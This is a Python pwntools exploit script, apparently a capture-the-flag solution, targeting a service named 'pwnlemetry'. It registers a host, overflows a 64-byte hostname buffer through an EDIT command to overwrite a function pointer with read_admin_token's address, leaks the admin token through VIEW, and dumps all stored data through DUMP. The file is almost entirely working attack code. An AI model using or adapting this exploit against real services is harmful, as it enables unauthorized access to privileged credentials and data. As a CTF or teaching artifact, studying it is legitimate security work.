#!/usr/bin/env python3
import argparse
import re
import struct
import sys

from pwn import ELF, log, remote


def register_host(hostname: str, remote_host: str, remote_port: int) -> str:
    r = remote(remote_host, remote_port)
    r.sendline(f"REGISTER {len(hostname)}".encode())
    r.send(hostname.encode())
    resp = r.recvall(timeout=1.0).decode()
    r.close()
    m = re.search(r"TOKEN ([0-9a-fA-F]+)", resp)
    if not m:
        raise Exception("Could not register host.")
    return m.group(1)


def edit_overflow(
    old_hostname: str,
    new_hostname: str,
    token: str,
    addr: int,
    remote_host: str,
    remote_port: int,
) -> None:
    r = remote(remote_host, remote_port)
    payload = (
        new_hostname.encode()
        + b"\0" * (64 - len(new_hostname))
        + struct.pack("<Q", addr)
    )
    r.sendline(f"EDIT {old_hostname} {token} {len(payload)}".encode())
    r.send(payload)
    resp = r.recvall(timeout=1.0).decode()
    r.close()
    print("[+] EDIT response:", resp.strip())


def trigger_view(hostname: str, token: str, remote_host: str, remote_port: int) -> str:
    r = remote(remote_host, remote_port)
    r.sendline(f"VIEW {hostname} {token}".encode())
    data = r.recvall(timeout=1.0).decode()
    r.close()
    print("[+] VIEW response:")
    print(data)
    m = re.search(r"([0-9a-fA-F]+)VIEWOK", data)
    if not m:
        raise Exception("No admin token found.")
    return m.group(1)


def dump_all(admin_token: str, remote_host: str, remote_port: int) -> str:
    r = remote(remote_host, remote_port)
    r.sendline(f"DUMP {admin_token}".encode())
    data = r.recvall(timeout=1.0).decode()
    r.close()
    return data


def main():
    parser = argparse.ArgumentParser(
        description="Exploit pwnlemetry Buff Overflow -> overwrite print_fn -> leak admin token -> Dump data"
    )
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=31337)
    parser.add_argument(
        "--binary",
        default="./pwnlemetry",
        help="local binary to resolve read_admin_token",
    )
    parser.add_argument(
        "--addr",
        type=lambda x: int(x, 0),
        help="manually set read_admin_token address",
    )
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()

    gen_addr = None
    if args.addr:
        gen_addr = args.addr
        log.info("Using manual read_admin_token addr: 0x%x", gen_addr)
    else:
        try:
            elf = ELF(args.binary)
            if "read_admin_token" in elf.symbols:
                gen_addr = elf.symbols["read_admin_token"]
                bits = elf.bits
                log.info(
                    "Found read_admin_token at 0x%x (bits=%d) in %s",
                    gen_addr,
                    bits,
                    args.binary,
                )
            else:
                log.warning("read_admin_token not found in local binary. Use --addr")
        except Exception as e:
            log.warning(
                "Could not open binary '%s': %s. Use --addr to specify address",
                args.binary,
                e,
            )

    if not gen_addr:
        print(
            "ERROR: need read_admin_token address (use --binary with -no-pie build or --addr)"
        )
        sys.exit(1)

    print("[*] Registering new host...")
    token = register_host("pwnhost", args.host, args.port)
    print("[+] Got host token:", token)

    print("[*] Sending overflow to overwrite print_fn...")
    edit_overflow("pwnhost", "pwnhost", token, gen_addr, args.host, args.port)

    print("[*] Triggering VIEW to call read_admin_token...")
    admin_token = trigger_view("pwnhost", token, args.host, args.port)
    print(f"[+] Got admin token: {admin_token}")

    print("[*] Dumping all monitored data (should include flag)...")
    data = dump_all(admin_token, args.host, args.port)
    print("[+] Dump result:\n", data)


if __name__ == "__main__":
    main()
